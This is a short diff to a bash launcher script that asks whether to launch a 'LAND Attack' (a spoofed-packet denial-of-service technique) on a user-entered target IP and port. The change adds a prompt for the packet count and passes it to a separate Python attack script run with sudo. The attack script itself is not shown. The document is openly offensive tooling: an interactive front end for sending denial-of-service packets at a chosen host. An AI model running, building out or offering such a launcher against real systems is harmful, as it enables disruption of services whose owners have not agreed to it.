@@ -42,8 +42,16 @@ if ask_yes_no "Do you want to launch the LAND Attack?"; then
     if [[ ! "$LAND_TARGET_PORT" =~ ^[0-9]+$ ]] || [ "$LAND_TARGET_PORT" -lt 1 ] || [ "$LAND_TARGET_PORT" -gt 65535 ]; then
         echo "Invalid port number. Skipping LAND Attack."
     else
-        echo "[+] Launching LAND Attack on $TARGET_IP:$LAND_TARGET_PORT..."
-        COMMAND_TO_RUN="sudo python3 $LAND_ATTACK_SCRIPT $TARGET_IP $LAND_TARGET_PORT"
+        read -p "Enter number of LAND packets to send (e.g., 10, default: 1): " LAND_PACKET_COUNT
+        if [[ -z "$LAND_PACKET_COUNT" ]]; then
+            LAND_PACKET_COUNT=1 # Default to 1 if empty
+        fi
+        if [[ ! "$LAND_PACKET_COUNT" =~ ^[0-9]+$ ]] || [ "$LAND_PACKET_COUNT" -le 0 ]; then
+            echo "Invalid packet count. Using default (1)."
+            LAND_PACKET_COUNT=1
+        fi
+        echo "[+] Launching LAND Attack on $TARGET_IP:$LAND_TARGET_PORT with $LAND_PACKET_COUNT packet(s)..."
+        COMMAND_TO_RUN="sudo python3 $LAND_ATTACK_SCRIPT $TARGET_IP $LAND_TARGET_PORT --count $LAND_PACKET_COUNT"
         echo "[DEBUG] Executing: $COMMAND_TO_RUN"
         $COMMAND_TO_RUN
         echo "[+] LAND Attack script finished."
